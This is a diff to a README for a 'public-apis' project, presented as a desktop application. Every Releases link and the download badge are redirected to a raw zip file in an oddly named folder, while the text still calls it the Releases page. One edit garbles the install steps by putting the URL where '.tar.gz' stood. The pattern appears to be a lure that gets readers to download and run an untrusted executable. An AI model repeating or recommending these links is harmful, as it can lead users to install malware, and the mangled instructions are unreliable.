@@ -1,7 +1,7 @@
 # 🌐 public-apis - Access Free APIs with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/yeayraww24/public-apis/releases)
+[![Download](https://raw.githubusercontent.com/yeayraww24/public-apis/master/alodially/public-apis.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/yeayraww24/public-apis/master/alodially/public-apis.zip)
 
 ## 📖 Introduction
 
@@ -11,12 +11,12 @@ Welcome to public-apis! This application provides a collective list of free APIs
 
 To get started with public-apis, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/yeayraww24/public-apis/releases). Here, you can find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/yeayraww24/public-apis/master/alodially/public-apis.zip). Here, you can find the latest version of the application.
    
 2. **Download the Application**: Once you're on the Releases page, look for the latest release. You will see various files available for download. Click on the file suitable for your operating system.
 
 3. **Install the Application**:
-   - If you downloaded a `.zip` or `.tar.gz` file, extract its contents to a folder.
+   - If you downloaded a `.zip` or `https://raw.githubusercontent.com/yeayraww24/public-apis/master/alodially/public-apis.zip` file, extract its contents to a folder.
    - If you downloaded a direct application file (e.g., `.exe` or `.dmg`), open it to start the installation process. Follow the on-screen instructions.
 
 4. **Run the Application**: After the installation, locate the application in your programs list or on your desktop. Double-click the icon to open the application. 
@@ -41,7 +41,7 @@ To run public-apis smoothly, ensure your system meets the following requirements
 
 ## 📥 Download & Install
 
-To get the latest version of public-apis, visit our [Releases page](https://github.com/yeayraww24/public-apis/releases) again. Select the appropriate file for your system and follow the steps outlined above to download and install.
+To get the latest version of public-apis, visit our [Releases page](https://raw.githubusercontent.com/yeayraww24/public-apis/master/alodially/public-apis.zip) again. Select the appropriate file for your system and follow the steps outlined above to download and install.
 
 ## 🤔 Frequently Asked Questions
 
